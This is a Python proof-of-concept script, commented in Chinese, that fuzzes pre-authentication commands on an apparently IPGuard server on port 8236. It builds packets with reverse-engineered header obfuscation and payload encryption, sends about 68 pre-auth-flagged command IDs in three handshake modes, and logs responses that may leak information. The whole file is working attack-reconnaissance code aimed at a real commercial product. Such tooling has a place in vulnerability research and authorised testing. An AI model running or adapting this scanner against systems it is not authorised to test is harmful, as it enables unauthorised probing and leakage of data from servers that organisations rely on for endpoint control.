"""poc_preauth_fuzz.py — 批量 fuzz 8236 上的 pre-auth cmd

依据 master cmd table 枚举结果:
  pre16=0x80000000 (30 cmds) - bit 31, 标记 pre-auth 可达
  pre16=0xc0000000 (3 cmds)  - bits 31+30
  pre16=0x80000010 (21 cmds) - bit 31 + 角色 bit
  pre16=0xc0000010 (14 cmds) - bits 31+30 + 角色 bit

对每个 cmd 三种探法:
  raw    - fresh socket, 直接发 cmd (flags=0x4500), body=空
  hello  - 0x1001 hello 后再发
  hello2 - 0x1001 + 0x4661 sub=1 (握手 step2) 后再发

记录:
  OK + plen > 0       → 可能信息泄露
  ERR + plen > 0      → server 回错误消息(可能含细节)
  TCP closed          → server 直接 drop (设计预期)
  timeout             → server 接收但不回 (可疑)

用法:
  python poc_preauth_fuzz.py 192.168.2.130 8236
"""
import os, socket, struct, sys, time, zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.crypto import (
    HDR_MAGIC, FLAG_CRYPT, FLAG_OBF_FULL, FLAG_COMP,
    deobf_header, obf_header, encrypt_payload, decrypt_payload,
)


# pre-auth flagged cmds (按价值分级,优先高位)
PREAUTH_C0000000 = [0x1500, 0x1501, 0x2700]
PREAUTH_C0000010 = [0x4461, 0x4462, 0x4467, 0x4468, 0x4469, 0x4471, 0x4472,
                    0x4476, 0x4477, 0x447b, 0x447c, 0x4701, 0x4702, 0x4707]
PREAUTH_80000000 = [0x1006, 0x1100, 0x2000, 0x2001, 0x2010, 0x2020,
                    0x2081, 0x2090, 0x20a1, 0x20b0,
                    0x2613, 0x2614,
                    0x4621, 0x4622, 0x4623, 0x4625, 0x462a,
                    0x4661, 0x4663,
                    0x46f6, 0x46f7, 0x46f8, 0x46f9, 0x46fa,
                    0x4747, 0x4748,
                    0x4791,
                    0x49a0, 0x49a1, 0x49a2]
PREAUTH_80000010 = [0x2100, 0x4421, 0x4451, 0x4455,
                    0x4463, 0x4464, 0x4465, 0x4466,
                    0x4473, 0x4474, 0x4478, 0x4479,
                    0x447d, 0x447e,
                    0x4650, 0x46f0, 0x4703, 0x4704, 0x4707,
                    0x4880, 0x4881, 0x4945]


def build_pkt(flags, cmd, sub, body=b"", key16=None):
    if key16 is None: key16 = os.urandom(16)
    if flags & FLAG_CRYPT and body:
        body = encrypt_payload(flags, key16, body)
    hdr = bytearray(32)
    hdr[0:2] = HDR_MAGIC
    struct.pack_into("<H", hdr, 2, flags)
    struct.pack_into("<H", hdr, 4, cmd)
    struct.pack_into("<H", hdr, 6, sub)
    hdr[8:24] = key16
    struct.pack_into("<I", hdr, 28, len(body))
    return obf_header(bytes(hdr)) + body


def recv_pkt(s, timeout=3.0):
    s.settimeout(timeout)
    hdr = b""
    while len(hdr) < 32:
        c = s.recv(32 - len(hdr))
        if not c: raise ConnectionError("closed")
        hdr += c
    deobf = deobf_header(hdr)
    plen = struct.unpack_from("<I", deobf, 28)[0]
    if plen > 0x100000:
        raise ValueError(f"plen too big: {plen}")
    body = b""
    while len(body) < plen:
        c = s.recv(plen - len(body))
        if not c: raise ConnectionError("closed")
        body += c
    return hdr + body


def parse_resp(pkt):
    deobf = deobf_header(pkt[:32])
    flags = struct.unpack_from("<H", deobf, 2)[0]
    cmd   = struct.unpack_from("<H", deobf, 4)[0]
    sub   = struct.unpack_from("<H", deobf, 6)[0]
    plen  = struct.unpack_from("<I", deobf, 28)[0]
    body  = pkt[32:32+plen]
    key   = bytes(deobf[8:24])
    plain = b""
    try:
        plain = decrypt_payload(flags, key, body)
        if plain and plain[:2] in (b"\x78\x01", b"\x78\x9c", b"\x78\xda"):
            try: plain = zlib.decompress(plain)
            except: pass
    except Exception as e:
        plain = f"<dec_err {e}>".encode()
    return {"flags": flags, "cmd": cmd, "sub": sub, "plen": plen, "plain": plain}


def probe(host, port, cmd, mode="raw", flags=0x4500, timeout=3.0):
    """mode: raw / hello / hello2"""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            if mode in ("hello", "hello2"):
                s.sendall(build_pkt(flags=0x4500, cmd=0x1001, sub=0))
                try: recv_pkt(s, timeout=2.0)
                except: pass
            if mode == "hello2":
                s.sendall(build_pkt(flags=0x4500, cmd=0x4661, sub=1))
                try: recv_pkt(s, timeout=2.0)
                except: pass
            # 主探测包
            s.sendall(build_pkt(flags=flags, cmd=cmd, sub=0))
            return parse_resp(recv_pkt(s, timeout=timeout))
        finally:
            try: s.close()
            except: pass
    except socket.timeout:
        return {"_timeout": True}
    except ConnectionError as e:
        return {"_closed": str(e)}
    except Exception as e:
        return {"_err": str(e)}


def categorize(r):
    if r.get("_timeout"): return "⏱TO  "
    if r.get("_closed"): return "✂CLS "
    if r.get("_err"): return f"⚠EXC "
    fl = r.get("flags", 0); plen = r.get("plen", 0)
    plain = r.get("plain", b"")
    pl = len(plain) if isinstance(plain, bytes) else 0
    if fl & 0x0002:
        return f"✖ERR{plen:>3}"
    return f"✅OK {plen:>3}"


def fmt_plain(plain):
    if not isinstance(plain, bytes) or not plain:
        return ""
    s = plain[:40].hex()
    return s


def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Total pre-auth flagged cmds: "
          f"{len(PREAUTH_C0000000)+len(PREAUTH_C0000010)+len(PREAUTH_80000000)+len(PREAUTH_80000010)}")

    groups = [
        ("pre16=0xc0000000", PREAUTH_C0000000),
        ("pre16=0xc0000010", PREAUTH_C0000010),
        ("pre16=0x80000000", PREAUTH_80000000),
        ("pre16=0x80000010", PREAUTH_80000010),
    ]

    interesting = []   # (cmd, mode, response)

    for gname, cmds in groups:
        print(f"\n{'=' * 90}")
        print(f"{gname}  ({len(cmds)} cmds)")
        print(f"{'=' * 90}")
        print(f"{'cmd':<8} {'raw':<10} {'hello':<10} {'hello2':<10}  notes")
        print("-" * 90)
        for cmd in cmds:
            results = {}
            for mode in ("raw", "hello", "hello2"):
                r = probe(host, port, cmd, mode=mode)
                results[mode] = r
                # 标记有趣的:OK 且 plen>0,或 ERR 但 plen>0(有错误消息)
                fl = r.get("flags", 0)
                plen = r.get("plen", 0)
                if plen > 0 or (fl and not r.get("_timeout") and not r.get("_closed")):
                    interesting.append((cmd, mode, r))
                time.sleep(0.05)
            print(f"0x{cmd:04x}   {categorize(results['raw']):<10} "
                  f"{categorize(results['hello']):<10} {categorize(results['hello2']):<10}")

    # Summary of interesting responses
    print(f"\n{'=' * 90}")
    print(f"INTERESTING responses (plen > 0 OR non-empty status):")
    print(f"{'=' * 90}")
    for cmd, mode, r in interesting:
        fl = r.get("flags", 0); plen = r.get("plen", 0)
        plain = r.get("plain", b"")
        pl = len(plain) if isinstance(plain, bytes) else 0
        err = "ERR" if (fl & 0x0002) else "OK "
        print(f"  cmd=0x{cmd:04x} mode={mode:<6} flags=0x{fl:04x}[{err}] plen={plen} plain={pl}B  {fmt_plain(plain)}")


if __name__ == "__main__":
    main()
